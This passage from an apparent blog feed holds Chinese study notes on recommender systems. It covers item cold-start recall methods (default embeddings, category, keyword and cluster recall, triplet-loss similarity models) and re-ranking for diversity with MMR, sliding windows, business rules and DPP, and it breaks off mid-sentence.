大盘消费指标</h3><p>另一类用户侧指标是大盘消费指标，也就是不区分新笔记和老笔记，做新笔记推荐的实验的时候，要考虑大盘的消费时长、日活、月活等指标。</p><p>在优化冷启时，不是要提高大盘的消费指标，而是要确保新的策略不会显著伤害大盘的指标。</p><p>大力扶持低曝光新笔记会发生什么？</p><ol><li>作者侧发布指标变好</li><li>用户侧大盘消费指标变差</li></ol><h2 id="1-3-内容侧指标"><a href="#1-3-内容侧指标" class="headerlink" title="1.3 内容侧指标"></a>1.3 内容侧指标</h2><p>还有一类叫做内容侧指标，有的大厂会考察此类指标。内容侧指标主要是高热笔记占比，高热笔记可以定义为前 30 天获得 1000+ 次点击。</p><p>高热笔记占比越高，说明冷启阶段挖掘优质笔记的能力越强。</p><hr><h1 id="2-简单的召回通道"><a href="#2-简单的召回通道" class="headerlink" title="2 简单的召回通道"></a>2 简单的召回通道</h1><p>新笔记自带图片、文字、地点以及算法或人工标注的标签。但是新笔记没有用户点击、点赞等信息，同时也没有笔记 ID embedding，缺少这个特征会对召回带来很大的困难。</p><p>冷启召回的困难：</p><ol><li>缺少用户交互，还没学好笔记 ID embedding，导致双塔模型效果不好。</li><li>缺少用户交互，导致 ItemCF 不适用。</li></ol><blockquote><p>ItemCF 不适用于物品冷启动</p></blockquote><p>ItemCF 做召回的原理是判断两篇笔记的相似度有多高，要根据与笔记交互过的用户来判定两篇笔记的相似度。下图中红色框内的用户与两篇笔记都有交互，是重合的。两个笔记的用户重合度越高，说明两篇笔记的相似度越高。</p><p>但是新笔记还没有和任何用户进行交互，所以不能计算和其他笔记的相似度，所以 ItemCF 不适用于冷启动。</p><p><img src="/2024/10/22/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B09%EF%BC%9A%E7%89%A9%E5%93%81%E5%86%B7%E5%90%AF%E5%8A%A81/image_9qlRvj0IR4.png"></p><p>召回通道：</p><ol><li>ItemCF召回（不适用）</li><li>双塔模型（改造后适用）</li><li>类目、关键词召回（适用）：在笔记刚发布时最有用</li><li>聚类召回（适用）</li><li>Look-Alike 召回（适用）</li></ol><h2 id="2-1-双塔模型"><a href="#2-1-双塔模型" class="headerlink" title="2.1 双塔模型"></a>2.1 双塔模型</h2><p>由于新笔记的 ID Embedding 需要从用户和笔记的交互中学习，但是新笔记还没有和用户交互过，所以这个嵌入还没有学好，直接用双塔模型做新笔记的召回效果不是很好。</p><p><img src="/2024/10/22/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B09%EF%BC%9A%E7%89%A9%E5%93%81%E5%86%B7%E5%90%AF%E5%8A%A81/image_nIwtxAMPKg.png"></p><h3 id="2-1-1-ID-Embedding"><a href="#2-1-1-ID-Embedding" class="headerlink" title="2.1.1 ID Embedding"></a>2.1.1 ID Embedding</h3><blockquote><p><strong>改进方案 1</strong>：新笔记使用 default embedding。</p></blockquote><p>物品塔做 ID embedding 时，让所有新笔记共享⼀个 ID，而不是用自己真正的 ID。</p><p>Default embedding：共享的 ID 对应的 embedding 向量。这个默认嵌入是学出来的，而不是全零初始化或默认初始化。新笔记发布之后逐渐会有点击和交互，到下次模型训练的时候，新笔记才有自己的 ID embedding 向量。</p><blockquote><p><strong>改进方案 2</strong>：利用相似笔记 embedding 向量。</p></blockquote><p>查找 top k 内容最相似的高曝笔记。把 $k$ 个高曝笔记的 embedding 向量取平均，作为新笔记的 embedding。之所以用高曝光笔记，是因为它们的 ID embedding 学的比较好。</p><h3 id="2-1-2-多个向量召回池"><a href="#2-1-2-多个向量召回池" class="headerlink" title="2.1.2 多个向量召回池"></a>2.1.2 多个向量召回池</h3><p>多个召回池，让新笔记有更多曝光机会。</p><ul><li>1 小时新笔记</li><li>6 小时新笔记</li><li>24 小时新笔记</li><li>30 天笔记</li></ul><p>上面这些召回池都共享同⼀个双塔模型，那么多个召回池不增加训练的代价。</p><h2 id="2-2-类目召回"><a href="#2-2-类目召回" class="headerlink" title="2.2 类目召回"></a>2.2 类目召回</h2><p>凡是做信息流社交电商的互联网公司，都是维护每一个用户的画像，画像中记录了用户的兴趣点，比如感兴趣的类目和关键词，这些类目和关键词可以用于召回。</p><p>系统维护类目索引：类目 → 笔记列表（按时间倒排），要用这个索引召回新笔记。之后在做召回时，取出用户感兴趣的类目。然后用类目索引做召回：用户画像 → 类目 → 笔记列表，取回笔记列表上前 $k$ 篇笔记（即最新的 $k$ 篇）。</p><p><img src="/2024/10/22/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B09%EF%BC%9A%E7%89%A9%E5%93%81%E5%86%B7%E5%90%AF%E5%8A%A81/image_vD7eSzR3t3.png"></p><h2 id="2-3-关键词召回"><a href="#2-3-关键词召回" class="headerlink" title="2.3 关键词召回"></a>2.3 关键词召回</h2><p>关键词召回和类目召回类似，唯一的区别是用关键词代替类目。系统维护关键词索引：关键词 → 笔记列表（按时间倒排），然后根据用户画像上的关键词做召回。</p><p><strong>类目召回和关键词召回的缺点：</strong></p><ol><li>只对刚刚发布的新笔记有效：取回某类目&#x2F;关键词下最新的 $k$ 篇笔记，发布几小时之后，就再没有机会被召回</li><li>弱个性化，不够精准：按照用户感兴趣的类目或关键词是很宽泛的</li></ol><hr><h1 id="3-聚类召回"><a href="#3-聚类召回" class="headerlink" title="3 聚类召回"></a>3 聚类召回</h1><p>聚类召回在物品冷启动的时候特别有用。</p><h2 id="3-1-基本思想"><a href="#3-1-基本思想" class="headerlink" title="3.1 基本思想"></a>3.1 基本思想</h2><p>如果用户喜欢⼀篇笔记，那么他会喜欢内容相似的笔记。可以事先训练⼀个神经网络，基于笔记的类目和图文内容，把笔记映射到向量。</p><p>对笔记向量做聚类，划分为 1000 cluster，记录每个 cluster 的中心方向（k-means 聚类，用余弦相似度）。</p><h3 id="3-1-1-聚类索引"><a href="#3-1-1-聚类索引" class="headerlink" title="3.1.1 聚类索引"></a>3.1.1 聚类索引</h3><p>当⼀篇新笔记发布之后，用神经网络把它映射到⼀个特征向量。然后把这个向量从 1000 个向量（对应 1000 个 cluster）中找到最相似的向量，作为新笔记的 cluster。</p><p>把新笔记的 ID 添加到索引上，索引是从 cluster 到笔记 ID 列表（按时间倒排）。</p><h3 id="3-1-2-线上召回"><a href="#3-1-2-线上召回" class="headerlink" title="3.1.2 线上召回"></a>3.1.2 线上召回</h3><p>当用户在刷小红书发起推荐请求，此时系统根据用户 ID，找到他的 last-n 交互的笔记列表，把这些笔记作为种子笔记，去召回相似的笔记。</p><p>用神经网络把每篇种子笔记映射到向量，寻找最相似的 cluster（这样知道了用户对哪些 cluster 感兴趣）。之后从每个 cluster 的笔记列表中，取回最新发布的 $m$ 篇笔记，最多取回 $mn$ 篇笔记。</p><h2 id="3-2-内容相似度模型"><a href="#3-2-内容相似度模型" class="headerlink" title="3.2 内容相似度模型"></a>3.2 内容相似度模型</h2><h3 id="3-2-1-提取图文特征"><a href="#3-2-1-提取图文特征" class="headerlink" title="3.2.1 提取图文特征"></a>3.2.1 提取图文特征</h3><p>用 CNN 提取图片的特征输出一个向量，用 BERT 提取文字的特征输出一个向量，把这两个向量做拼接，然后输入全连接层，最后得到笔记的特征向量。这个向量是对笔记图文特征的表征。</p><p><img src="/2024/10/22/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B09%EF%BC%9A%E7%89%A9%E5%93%81%E5%86%B7%E5%90%AF%E5%8A%A81/image_kJlJ-xaORW.png"></p><h3 id="3-2-2-两篇笔记内容相似度"><a href="#3-2-2-两篇笔记内容相似度" class="headerlink" title="3.2.2 两篇笔记内容相似度"></a>3.2.2 两篇笔记内容相似度</h3><p>把左边的笔记送入刚才的神经网络，得到这个笔记的特征向量 $a$，同样的操作，把右边的笔记也送入神经网络，得到特征向量 $b$，这两个神经网络是相同的。</p><p>最后计算向量 $a$ 和 $b$ 的余弦相似度 $\cos (a, b)$。</p><p><img src="/2024/10/22/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B09%EF%BC%9A%E7%89%A9%E5%93%81%E5%86%B7%E5%90%AF%E5%8A%A81/image_ypJX0n7Sg4.png"></p><h3 id="3-2-3-训练内容相似度模型"><a href="#3-2-3-训练内容相似度模型" class="headerlink" title="3.2.3 训练内容相似度模型"></a>3.2.3 训练内容相似度模型</h3><p>每个训练样本都是一个三元组：&lt; 正样本，种子样本，负样样本 &gt;。把这三个样本送入神经网络，神经网络的参数都是相同的，然后得到向量 $b^+$、$a$ 和 $b^-$，分别计算 $\cos \left(\mathrm{a}, \mathrm{b}^{+}\right)$ 和 $\cos \left(\mathrm{a}, \mathrm{b}^{-}\right)$。</p><p><strong>做训练的目标</strong>：鼓励 $\cos \left(a, b^{+}\right)$ 大于 $\cos \left(a, b^{-}\right)$</p><p>Triplet hinge loss：</p><p>$$<br>L(\mathbf{a}, \mathbf{b}^{+}, \mathbf{b}^{-})&#x3D;\max \{0, \cos (\mathbf{a}, \mathbf{b}^{-})+m-\cos (\mathbf{a}, \mathbf{b}^{+})\}<br>$$</p><p>Triplet logistic loss：</p><p>$$<br>L\left(\mathbf{a}, \mathbf{b}^{+}, \mathbf{b}^{-}\right)&#x3D;\log \left(1+\exp \left(\cos \left(\mathbf{a}, \mathbf{b}^{-}\right)-\cos \left(\mathbf{a}, \mathbf{b}^{+}\right)\right)\right)<br>$$</p><p><img src="/2024/10/22/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B09%EF%BC%9A%E7%89%A9%E5%93%81%E5%86%B7%E5%90%AF%E5%8A%A81/image_LWsGiNlEli.png"></p><h3 id="3-2-4-正负样本的选取"><a href="#3-2-4-正负样本的选取" class="headerlink" title="3.2.4 正负样本的选取"></a>3.2.4 正负样本的选取</h3><blockquote><p><strong>&lt; 种子笔记，正样本 &gt;</strong></p></blockquote><p>方法一：人工标注⼆元组的相似度，但是人工标注的代价太大</p><p>方法二：算法自动选正样本，可以设置如下的筛选条件</p><ol><li>只用高曝光笔记作为⼆元组（因为有充⾜的用户交互信息）</li><li>两篇笔记有相同的⼆级类目，比如都是“菜谱教程”</li></ol><p>最后用用 ItemCF 的物品相似度选正样本。</p><blockquote><p><strong>&lt; 种子笔记，负样本 &gt;</strong></p></blockquote><p>负样本的选择很容易，直接从全体笔记中随机选出下列满足条件的即可：</p><ol><li>字数较多（神经网络提出的文本信息有效）</li><li>笔记质量高，避免图文无关</li></ol><h2 id="3-3-总结"><a href="#3-3-总结" class="headerlink" title="3.3 总结"></a>3.3 总结</h2><p><strong>基本思想</strong>：根据用户的点赞、收藏、转发记录，推荐内容相似的笔记。</p><ul><li>线下训练：多模态神经网络把图文内容映射到向量</li><li>线上服务：用户喜欢的笔记 → 特征向量 → 最近的 Cluster → 新笔记</li></ul>]]></content>
      
      
      <categories>
          
          <category> 推荐系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 推荐系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WSS推荐系统学习笔记8：重排</title>
      <link href="/2024/10/21/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B08%EF%BC%9A%E9%87%8D%E6%8E%92/"/>
      <url>/2024/10/21/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B08%EF%BC%9A%E9%87%8D%E6%8E%92/</url>
      
        <content type="html"><![CDATA[<h1 id="1-推荐系统中的多样性"><a href="#1-推荐系统中的多样性" class="headerlink" title="1 推荐系统中的多样性"></a>1 推荐系统中的多样性</h1><h2 id="1-1-物品相似性的度量"><a href="#1-1-物品相似性的度量" class="headerlink" title="1.1 物品相似性的度量"></a>1.1 物品相似性的度量</h2><p>可以基于物品属性标签：类目、品牌、关键词……如果两个物品相同的属性标签越多，那么两个物品就越相似。</p><p>也可以使用基于物品的向量表征，用召回的双塔模型学到的物品向量表征效果不太好，但是使用基于内容的向量表征效果比较好，也就是使用 CV 和 NLP 模型提取图片和文字的特征向量。</p><h2 id="1-2-基于物品属性标签"><a href="#1-2-基于物品属性标签" class="headerlink" title="1.2 基于物品属性标签"></a>1.2 基于物品属性标签</h2><p>物品属性标签通常是 CV 和 NLP 算法根据物品内容推断出的，不一定准确，可以根据一级类目、二级类目、品牌等标签计算相似度。例如有两个物品：</p><ul><li>物品 $i$：美妆、彩妆、香奈儿</li><li>物品 $j$：美妆、香水、香奈儿</li></ul><p>则相似度为 $\operatorname{sim}_{1}(i, j)&#x3D;1, \operatorname{sim}_{2}(i, j)&#x3D;0, \operatorname{sim}_{3}(i, j)&#x3D;1$，对三个分数求加权和，即可得到相似度的总分，其中的权重需要根据经验设置。</p><h2 id="1-3-基于向量表征计算相似度"><a href="#1-3-基于向量表征计算相似度" class="headerlink" title="1.3 基于向量表征计算相似度"></a>1.3 基于向量表征计算相似度</h2><p>双塔模型的两个塔分别把用户特征和物品特征映射成向量，记作 $a$ 和 $b$，两个向量的余弦相似度 $\cos(a, b)$ 记作用户对物品的兴趣。</p><p>在多样性问题上，我们只需要物品塔的输出，物品塔把每个物品表征为一个向量 $b$，如果两个物品相似，则向量表征的内积相似度比较大，或者余弦相似度比较大。</p><p>把物品塔学习到的物品表征用在多样性问题上是可以的，但是效果一般，原因是推荐系统中的头部现象很严重，曝光和点击都集中在少数物品，新物品和长尾物品的曝光和点击都很少，双塔模型学不好它们的向量表征。</p><p><img src="/2024/10/21/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B08%EF%BC%9A%E9%87%8D%E6%8E%92/image_KNbPB8FQqF.png"></p><h2 id="1-4-基于图文内容的物品表征"><a href="#1-4-基于图文内容的物品表征" class="headerlink" title="1.4 基于图文内容的物品表征"></a>1.4 基于图文内容的物品表征</h2><p>在多样性问题上，最好的办法还是基于图文内容的向量表征。分别使用 CNN 和 BERT 对图片和文本内容进行处理，得到两个向量。</p><p><img src="/2024/10/21/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B08%EF%BC%9A%E9%87%8D%E6%8E%92/image_n6dYrl0MwR.png"></p><p>但是如何训练这两个模型呢？CLIP 是当前公认最有效的预训练⽅法。</p><ul><li><strong>思想：</strong> 对于图片—文本二元组，预测图文是否匹配</li><li><strong>优势：</strong>无需人工标注。小红书的笔记天然包含图片+文字，大部分笔记图文相关</li></ul><p>做训练的时候，同一个笔记的图片和文字作为正样本，图片的向量和文字的向量应该高度相似，如果图片和文字来自不同的笔记，那么可以当作负样本。可以使用 batch 内负样本，一个 batch 内有 $m$ 对正样本，一张图片和 $m - 1$ 条文本组成负样本，则这个 batch 内一共有 $m(m-1)$ 对负样本。</p><p><img src="/2024/10/21/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B08%EF%BC%9A%E9%87%8D%E6%8E%92/image_N5a2yDWy2s.png"></p><h2 id="1-5-提升多样性的方法"><a href="#1-5-提升多样性的方法" class="headerlink" title="1.5 提升多样性的方法"></a>1.5 提升多样性的方法</h2><blockquote><p>推荐系统的链路</p></blockquote><p><img src="/2024/10/21/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B08%EF%BC%9A%E9%87%8D%E6%8E%92/image_Q4UfTdpogd.png"></p><p>粗排和精排用多目标模型对物品做 pointwise 打分，而不用考虑物品之间的关联。对于物品 $i$，模型输出点击率、交互率的预估，融合成分数 $\operatorname{reward}_i$。</p><p>$\operatorname{reward}_i$ 表示用户对物品 $i$ 的兴趣，在排序中，$\operatorname{reward}_i$ 是物品本⾝对用户的价值。</p><p><img src="/2024/10/21/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B08%EF%BC%9A%E9%87%8D%E6%8E%92/image_GmSJbDNf66.png"></p><p>给定 $n$ 个候选物品，排序模型打分，得到：</p><p>$$<br>\text{reward}_1 ,\operatorname{reward}_{2} , \cdots, \operatorname{reward}_{n}<br>$$</p><p>对于粗排，$n$ 为几千；对于精排，$n$ 为几百。后处理的主要作用是提高多样性，需要从 $n$ 个候选物品中选出 $k$ 个，既要它们的总分高，也需要它们有多样性。如果不考虑多样性，那么只需要根据 $\operatorname{reward}_i$ 对 $n$ 个物品排序选出 TopK。在实践中，增加物品的多样性有利于增加指标。</p><p>精排的后处理被称为重排，粗排后也需要多样性算法。</p><hr><h1 id="2-MMR"><a href="#2-MMR" class="headerlink" title="2 MMR"></a>2 MMR</h1><h2 id="2-1-原理"><a href="#2-1-原理" class="headerlink" title="2.1 原理"></a>2.1 原理</h2><p>MMR（Maximal Marginal Relevance）搜索的结果主要就是根据相关性做排序，MMR 是先被用到搜索排序，后被用到推荐排序。</p><p>精排给 $n$ 个候选物品打分，融合之后的分数为：</p><p>$$<br>\operatorname{reward}_{1} ,\operatorname{reward}_{2} , \cdots, \operatorname{reward}_{n}<br>$$</p><p>精排中 $n$ 的大小通常是几百，把第 $i$ 和 $j$ 个物品的相似度记作 $\operatorname{sim}(i, j)$，可以是用物品标签计算出的，也可以是用向量表征计算出的。在精排的后处理阶段也就是重排，需要从 $n$ 个候选物品中选出 $k$ 个，选出的物品既要有高精排分数，也要有多样性。</p><p>下面介绍 MMR 多样性算法，下图中左边的物品是选中的物品，右边是未选中的物品。</p><p><img src="/2024/10/21/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B08%EF%BC%9A%E9%87%8D%E6%8E%92/image_Dp1znk-HwB.png"></p><p>计算集合 ℛ 中每个物品 $i$ 的 Marginal Relevance 分数，也就是给未选中的物品打分：</p><p>$$<br>\mathrm{MR}_{i}&#x3D;\theta \cdot \operatorname{reward}_{i}-(1-\theta) \cdot \max _{j \in \mathcal{S}} \operatorname{sim}(i, j)<br>$$</p><p>MR 由两项组成：</p><ul><li>$\operatorname{reward}_i$ 表示物品 $i$ 的精排分数</li><li>$\max _{i \in S} \operatorname{sim}(i, j)$ 表示物品 $i$ 的多样性分数，计算 $i$ 与 $j$ 的相似度，再关于 $j$ 求最大化，这样可以衡量 $i$ 与集合 $\mathcal{S}$ 的相似度</li><li>$\theta$ 越大，则物品价值对排序的影响越大；反之越小，则对排序的影响越小</li></ul><p>MMR 就是对 MR 分数求最大化，对于所有未选中的物品 $i$，计算出它的 $\operatorname{MR}_i$，并选出分数最高的物品：</p><p>$$<br>\underset{i \in \mathcal{R}}{\operatorname{argmax}} \mathrm{MR}_{i}<br>$$</p><p>每一轮都需要计算出集合 $\mathcal{R}$ 中所有物品的分数，然后选出分数最高的物品，把这个物品从集合 $\mathcal{R}$ 移动到集合 $\mathcal{S}$。</p><h2 id="2-2-总结"><a href="#2-2-总结" class="headerlink" title="2.2 总结"></a>2.2 总结</h2><p>总体步骤如下：</p><ol><li>选中的物品 $\mathcal{S}$ 初始化为空集，未选中的物品 ℛ 初始化为全集 ${1, \cdots, n}$。</li><li>选择精排分数 $\operatorname{reward}_{i}$ 最高的物品，从集合 ℛ 移到 $\mathcal{S}$。</li><li>做 $k-1$ 轮循环：<ul><li>计算集合 ℛ 中所有物品的分数 $\{\mathrm{MR}_{i} \}_{i \in \mathcal{R}}$。</li><li>选出分数最高的物品，将其从 ℛ 移到 $\mathcal{S}$。</li></ul></li></ol><h2 id="2-3-滑动窗口"><a href="#2-3-滑动窗口" class="headerlink" title="2.3 滑动窗口"></a>2.3 滑动窗口</h2><p>$$<br>\text{MMR}: \underset{i \in \mathcal{R}}{\operatorname{argmax}}\{\theta \cdot \operatorname{reward}_{i}-(1-\theta) \cdot \max _{j \in \mathcal{S}} \operatorname{sim}(i, j)\}<br>$$</p><p>使用上述公式存在的问题：已选中的物品越多（即集合 $\mathcal{S}$ 越大），越难找出物品 $i \in \mathcal{R}$，使得 $i$ 与 $\mathcal{S}$ 中的物品都不相似。设 sim 的取值范围是 $[0, 1]$。当 $\mathcal{S}$ 很大时，多样性分数 $\max _{j \in \mathcal{S}} \operatorname{sim}(i, j)$ 总是约等于 1，导致 MMR 算法失效。</p><p><strong>解决方案是使用滑动窗口：</strong>设置一个滑动窗口 $\mathcal{W}$，比如最近选中的 10 个物品，用 $\mathcal{W}$ 代替 MMR 公式中的 $\mathcal{S}$，这样就可以解决上述问题。</p><p>改进后的公式如下，上面的公式用集合 $\mathcal{S}$，下面的公式用集合 $\mathcal{W}$。</p><p><img src="/2024/10/21/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B08%EF%BC%9A%E9%87%8D%E6%8E%92/image_lAieogklol.png"></p><p>工业界实际的重排都是用滑动窗口。</p><p><img src="/2024/10/21/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B08%EF%BC%9A%E9%87%8D%E6%8E%92/image_ivpgEu-CBI.png"></p><hr><h1 id="3-重排的规则"><a href="#3-重排的规则" class="headerlink" title="3 重排的规则"></a>3 重排的规则</h1><blockquote><p><strong>规则</strong>：最多连续出现 $k$ 篇某种笔记</p></blockquote><p>小红书推荐系统的物品分为图文笔记、视频笔记。最多连续出现 $k&#x3D;5$ 篇图文笔记，最多连续出现 $k&#x3D;5$ 篇视频笔记。如果排 $i$ 到 $i+4$ 的全都是图文笔记，那么排在 $i+5$ 的必须是视频笔记。</p><blockquote><p><strong>规则</strong>：每 $k$ 篇笔记最多出现 1 篇某种笔记</p></blockquote><p>运营推广笔记的精排分会乘以大于 1 的系数（boost），帮助笔记获得更多曝光。为了防⽌ boost 影响体验，限制每 $k&#x3D;9$ 篇笔记最多出现 1 篇运营推广笔记。如果排第 $i$ 位的是运营推广笔记，那么排 $i+1$ 到 $i+8$ 的不能是运营推广笔记。</p><blockquote><p><strong>规则</strong>：前 $t$ 篇笔记最多出现 $k$ 篇某种笔记</p></blockquote><p>排名前 $t$ 篇笔记最容易被看到，对用户体验最重要（小红书的 top 4 为⾸屏）。小红书推荐系统有带电商卡片的笔记，过多可能会影响体验。</p><ul><li>前 $t&#x3D;1$ 篇笔记最多出现 $k&#x3D;0$ 篇带电商卡片的笔记</li><li>前 $t&#x3D;4$ 篇笔记最多出现 $k&#x3D;1$ 篇带电商卡片的笔记</li></ul><p>MMR 每一轮选出一个物品：</p><p><img src="/2024/10/21/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B08%EF%BC%9A%E9%87%8D%E6%8E%92/image_4uFMkl-Jwk.png"></p><p>工业界推荐系统在做重排的时候需要结合 MMR 与规则，在满⾜规则的前提下最大化 MR。每一轮先用规则排除掉 $\mathcal{R}$ 中的部分物品，得到⼦集 $\mathcal{R}’$。MMR 公式中的 $\mathcal{R}$ 替换成⼦集 $\mathcal{R}’$，选中的物品符合规则。</p><hr><h1 id="4-DPP-数学基础"><a href="#4-DPP-数学基础" class="headerlink" title="4 DPP 数学基础"></a>4 DPP 数学基础</h1><h2 id="4-1-超平面体"><a href="#4-1-超平面体" class="headerlink" title="4.1 超平面体"></a>4.1 超平面体</h2><p>2 维空间的超平行体为平行四边形，平行四边形中的点可以表示为：</p><p>$$<br>\boldsymbol{x}&#x3D;\alpha_{1} \boldsymbol{v}_1 +\alpha_{2}  \boldsymbol{v}_{2}<br>$$</p><ul><li>系数 $\alpha_1$ 和 $\alpha_2$ 的取值范围是 $[0, 1]$</li></ul><p><img src="/2024/10/21/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B08%EF%BC%9A%E9%87%8D%E6%8E%92/image_emzgf7pHFB.png"></p><p>3 维空间的超平行体为平行六面体，平行六面体中的点可以表示为：</p><p>$$<br>\boldsymbol{x}&#x3D;\alpha_{1} \boldsymbol{v}_1 +\alpha_{2}  \boldsymbol{v}_{2} +\alpha_{3}  \boldsymbol{v}_{3}<br>$$</p><p><img src="/2024/10/21/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B08%EF%BC%9A%E9%87%8D%E6%8E%92/image_gPEu8-9XNJ.png"></p><p>一组向量 $\boldsymbol{v}_{1} , \cdots, \boldsymbol{v}_{k} \in \mathbb{R}^{d}$ 可以确定一个 $k$ 维超平行体：</p><p>$$<br>\mathcal{P}(\boldsymbol{v}_{1}, \cdots, \boldsymbol{v}_{k})&#x3D;\{\alpha_{1} \boldsymbol{v}_{1}+\cdots+\alpha_{k} \boldsymbol{v}_{k} \mid 0 \leq \alpha_{1}, \cdots, \alpha_{k} \leq 1\}<br>$$</p><p>要求 $k \leq d$，比如 $d&#x3D;3$ 维空间中有 $k&#x3D;2$ 维平行四边形。如果 $v_{1}, \cdots, v_{k}$ 线性相关，则体积 $\operatorname{vol}(\mathcal{P})&#x3D;0$。例如，有 $k&#x3D;3$ 个向量，落在一个平面上，则平行六面体的体积为 0。</p><h2 id="4-2-如何衡量物品多样性"><a href="#4-2-如何衡量物品多样性" class="headerlink" title="4.2 如何衡量物品多样性"></a>4.2 如何衡量物品多样性</h2><blockquote><p>平行四边形的面积</p></blockquote><p><img src="/2024/10/21/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B08%EF%BC%9A%E9%87%8D%E6%8E%92/image_YafTCV12hO.png"></p><p>计算公式如下，即以 $v_1$ 为底，计算高 $q_2$，两个向量必须正交。</p><p>$$<br>面积 &#x3D;| 底 \left|_{2} \times\right| 高 |_{2}<br>$$</p><p>以 $v_1$ 为底，如何计算高 $q_2$？首先计算 $v_2$ 在 $v_1$ 上的投影：</p><p>$$<br>\operatorname{Proj}_{v_{1}}\left(v_{2}\right)&#x3D;\frac{v_{1}^{T} v_{2}}{\left|v_{1}\right|_{2}^{2}} \cdot v_{1}<br>$$</p><p>然后 $\boldsymbol{q}_{2}&#x3D;\boldsymbol{v}_{2}-\operatorname{Proj}_{\boldsymbol{v}_{1}}\left(\boldsymbol{v}_{2}\right)$，此时底 $v_1$ 与高 $q_2$ 正交。</p><p>给定 $k$ 个物品，把它们表征为单位向量 ${v}_{1}, \cdots, {v}_{k} \in \mathbb{R}^{d} (d \geq k)$。用超平行体的体积衡量物品的多样性，体积介于 0 和 1 之间。</p><ul><li>如果 $v_{1}, \cdots, v_{k}$ 两两正交（多样性好），则体积最大化 $\mathrm{vol}&#x3D;1$</li><li>如果 $v_{1}, \cdots, v_{k}$ 线性相关（多样性差），则体积最小化 $\mathrm{vol}&#x3D;0$</li></ul><p><img src="/2024/10/21/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B08%EF%BC%9A%E9%87%8D%E6%8E%92/image__8A26xJUHY.png"></p><p>把上述单位向量 $v_{1}, \cdots, v_{k} \in \mathbb{R}^{d}$ 作为矩阵 $\boldsymbol{V} \in \mathbb{R}^{d \times k}$ 的列，设 $d \geq k$，则行列式与体积满足：</p><p>$$<br>\operatorname{det}\left({V}^{T} {V}\right)&#x3D;\operatorname{vol}\left(\mathcal{P}\left({v}_{1}, \cdots, {v}_{k}\right)\right)^{2}<br>$$</p><p>因此可以用行列式 $\operatorname{det}\left({V}^{T} {V}\right)$ 衡量向量 $v_{1}, \cdots, v_{k}$ 的多样性。</p><hr><h1 id="5-DPP-多样性算法"><a href="#5-DPP-多样性算法" class="headerlink" title="5 DPP 多样性算法"></a>5 DPP 多样性算法</h1><h2 id="5-1-多样性问题"><a href="#5-1-多样性问题" class="headerlink" title="5.1 多样性问题"></a>5.1 多样性问题</h2><p>精排给 $n$ 个候选物品打分为 $\operatorname{reward}_{1}, \cdots, \operatorname{reward}_{n}$ 表示物品的价值，$n$ 个物品的向量表征为 $\boldsymbol{v}_{1}, \cdots, \boldsymbol{v}_{n} \in \mathbb{R}^{d}$，之后从 $n$ 个物品中选出 $k$ 个物品，组成集合 $\mathcal{S}$，做选择要考虑两个因素：</p><ul><li><strong>价值大：</strong>分数之和 $\sum_{j \in \mathcal{S}} \operatorname{reward}_{j}$ 越大越好</li><li><strong>多样性好：</strong>$\mathcal{S}$ 中 $k$ 个向量组成的超平形体 $\mathcal{P}(\mathcal{S})$ 的体积越大越好，体积越大，多样性越好</li></ul><p><img src="/2024/10/21/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B08%EF%BC%9A%E9%87%8D%E6%8E%92/image_hCjXg_VxHq.png"></p><p>集合 $\mathcal{S}$ 中的 $k$ 个物品的向量作为列，组成矩阵 ${V}_{\mathcal{S}} \in \mathbb{R}^{d \times k}$。以这 $k$ 个向量作为边，组成超平形体 $\mathcal{P}(\mathcal{S})$。体积 